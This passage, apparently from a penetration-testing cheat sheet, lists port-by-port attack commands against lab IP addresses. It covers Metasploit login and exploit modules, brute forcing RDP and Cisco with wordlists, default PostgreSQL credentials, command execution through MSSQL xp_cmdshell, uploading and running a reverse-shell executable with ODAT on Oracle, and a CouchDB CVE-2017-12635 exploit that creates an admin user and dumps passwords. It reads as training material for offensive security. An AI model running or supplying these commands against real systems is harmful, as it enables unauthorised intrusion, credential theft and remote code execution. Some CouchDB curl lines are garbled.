 auxiliary/scanner/snmp/epmp1000_snmp_loot                             
 auxiliary/scanner/snmp/netopia_enum                                    
 auxiliary/scanner/snmp/sbg6580_enum                                 
 auxiliary/scanner/snmp/snmp_enum                                 
 auxiliary/scanner/snmp/snmp_enum_hp_laserjet                           
 auxiliary/scanner/snmp/snmp_enumshares                                
 auxiliary/scanner/snmp/snmp_enumusers                                 
 auxiliary/scanner/snmp/snmp_login
```

## Port 389,636 - LDAP

Check [AD](../post-exploitation/windows/ad/) section and this [LDAP](https://malicious.link/post/2022/ldapsearch-reference/) guide

```bash
jxplorer
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
python3 windapsearch.py --dc-ip 10.10.10.182 --users --full > windapsearch_users.txt
cat windapsearch_users.txt | grep sAMAccountName | cut -d " " -f 2 > users.txt
# Check # https://github.com/ropnop/go-windapsearch
```

## Port 443 - HTTPS

Read the actual SSL CERT to:

* find out potential correct vhost to GET
* is the clock skewed
* any names that could be usernames for bruteforce/guessing.

```bash
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
# Check for mod_ssl,OpenSSL version Openfuck
```

## Port 500 - ISAKMP IKE

```
ike-scan 10.11.1.111
```

## Port 513 - Rlogin

```
apt install rsh-client
rlogin -l root 10.11.1.111
```

## Port 541 - FortiNet SSLVPN

[Fortinet Ports Guide](https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png)

[SSL VPN Leak](https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?\_\_cf\_chl\_jschl\_tk\_\_=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql\_GT\_ovKiar\_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6\_R9Dtw89\_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip\_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5\_iK0kMNJg3mskrFVQz0lONaZVvFRdf\_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s\_lVIj2SAJQQ)

## Port 1433 - MSSQL

```bash
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
    xp_cmdshell 'date'
      go


EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami")'

https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
```

## Port 1521 - Oracle

```bash
oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

# https://github.com/quentinhardy/odat
./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

# Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

# and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe
```

## Port 2000 - Cisco sccp

```bash
# cisco-audit-tool
CAT -h ip -p 2000 -w /usr/share/wordlists/rockyou.txt 

# cisco-smart-install
https://github.com/Sab0tag3d/SIET/
sudo python siet.py -g -i 192.168.0.1
```

## Port 2049 - NFS

```bash
nmap -p 111,2049 --script nfs-ls,nfs-showmount

showmount -e 10.11.1.111

# If you find anything you can mount it like this:

mount 10.11.1.111:/ /tmp/NFS –o nolock
mount -t nfs 10.11.1.111:/ /tmp/NFS –o nolock
```

## Port 2100 - Oracle XML DB

Default passwords:

[https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm](https://docs.oracle.com/cd/B10501\_01/win.920/a95490/username.htm)

## Port 3306 - MySQL

```bash
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

# MYSQL UDF 4.x/5.0
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

## Port 3389 - RDP

```bash
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
python crowbar.py -b rdp -s 10.11.1.111/32 -u admin -C ../rockyou.txt -v
```

## Port 5432 - PostgreSQL

```bash
psql -h 10.10.1.111 -U postgres -W

# Default creds
postgres : postgres
postgres : password
postgres : admin
admin : admin
admin : password

pg_dump --host=10.10.1.111 --username=postgres --password --dbname=template1 --table='users' -f output_pgdump
```

## Port 5900 - VNC

```bash
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
```

## Port 5984 - CouchDB

```bash
curl http://example.com:5984/
curl -X GET http://IP:5984/_all_dbs
curl -X GET http://user:password@IP:5984/_all_dbs

# CVE-2017-12635 RCE

# Create user
curl -X PUT ‘http://localhost:5984/_users/org.couchdb.user:chenny' — data-binary ‘{ “type”: “user”, “name”: “chenny”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’

# Dump database
curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u chenny:-Xpassword <ds/_all_docs?include_docs=true -u chenny:-Xpassword

# Dump passwords
curl -X GET http://user:passwords@localhost:5984/passwords
```

## Port 5985 - WinRM

```bash
# https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
```

## Port 6379 - Redis

```bash
# https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis
```

## Port 8172 - MsDeploy

```bash
# Microsoft IIS Deploy port
IP:8172/msdeploy.axd
```

## Port 5601/9200

[ELK](webservices/elk.md)

## Port 27017-19/27080/28017 - MongoDB

[MongoDB](webservices/nosql-and-and-mongodb.md)

## Unknown ports

* `amap -d 10.11.1.111 8000`
* netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
* sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, using basic HTTP configurations

## RCE ports

![](<../.gitbook/assets/image (1).png>)
